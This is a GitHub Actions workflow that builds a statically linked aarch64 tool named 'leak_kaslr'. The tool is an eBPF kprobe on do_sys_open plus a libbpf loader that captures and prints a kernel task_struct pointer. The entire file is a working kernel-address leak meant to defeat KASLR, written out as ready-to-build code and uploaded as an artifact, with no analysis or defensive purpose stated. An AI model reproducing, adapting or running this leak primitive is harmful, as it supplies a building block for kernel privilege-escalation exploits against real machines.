name: build_ebpf_leak
on: [push, workflow_dispatch]

jobs:
  build:
    runs-on: ubuntu-24.04-arm
    steps:
      - uses: actions/checkout@v4

      - name: Install dependencies
        run: |
          sudo DEBIAN_FRONTEND=noninteractive apt-get update -y
          sudo DEBIAN_FRONTEND=noninteractive apt-get install -y clang llvm libbpf-dev libelf-dev zlib1g-dev libzstd-dev

      - name: Build eBPF + Loader
        run: |
          cat << 'EOF' > leak.bpf.c
          #include <linux/bpf.h>
          #include <bpf/bpf_helpers.h>

          struct {
              __uint(type, BPF_MAP_TYPE_ARRAY);
              __uint(max_entries, 1);
              __type(key, __u32);
              __type(value, __u64);
          } leak_map SEC(".maps");

          SEC("kprobe/do_sys_open")
          int leak_kaslr(struct pt_regs *ctx) {
              __u32 key = 0;
              __u64 task = (__u64)bpf_get_current_task();
              bpf_map_update_elem(&leak_map, &key, &task, 0);
              return 0;
          }
          char _license[] SEC("license") = "GPL";
          EOF
          
          # הוספת נתיב ה-headers של aarch64
          clang -target bpf -O2 -g -I/usr/include/aarch64-linux-gnu -c leak.bpf.c -o leak.bpf.o
          
          cat << 'EOF' > leak.c
          #include <stdio.h>
          #include <stdlib.h>
          #include <string.h>
          #include <errno.h>
          #include <bpf/libbpf.h>
          #include <bpf/bpf.h>

          int main(void) {
              struct bpf_object *obj;
              struct bpf_program *prog;
              struct bpf_link *link;
              struct bpf_map *map;
              int map_fd, err;
              __u32 key = 0;
              __u64 value = 0;

              obj = bpf_object__open_file("leak.bpf.o", NULL);
              err = libbpf_get_error(obj);
              if (err) { fprintf(stderr, "open: %s\n", strerror(-err)); return 1; }

              err = bpf_object__load(obj);
              if (err) { fprintf(stderr, "load: %s errno=%d\n", strerror(-err), errno); return 1; }

              prog = bpf_object__find_program_by_name(obj, "leak_kaslr");
              if (!prog) { fprintf(stderr, "no prog\n"); return 1; }

              link = bpf_program__attach(prog);
              err = libbpf_get_error(link);
              if (err) { fprintf(stderr, "attach: %s errno=%d\n", strerror(-err), errno); return 1; }

              FILE *f = fopen("/etc/hosts", "r");
              if (f) fclose(f);

              map = bpf_object__find_map_by_name(obj, "leak_map");
              map_fd = bpf_map__fd(map);
              bpf_map_lookup_elem(map_fd, &key, &value);

              printf("Leaked task_struct: 0x%llx\n", (unsigned long long)value);

              bpf_link__destroy(link);
              bpf_object__close(obj);
              return 0;
          }
          EOF
          
          gcc -static -O2 leak.c -o leak -lbpf -lelf -lz -lzstd
          file leak
          ls -la leak leak.bpf.o

      - uses: actions/upload-artifact@v4
        with:
          name: ebpf-leak
          path: |
            leak
            leak.bpf.o
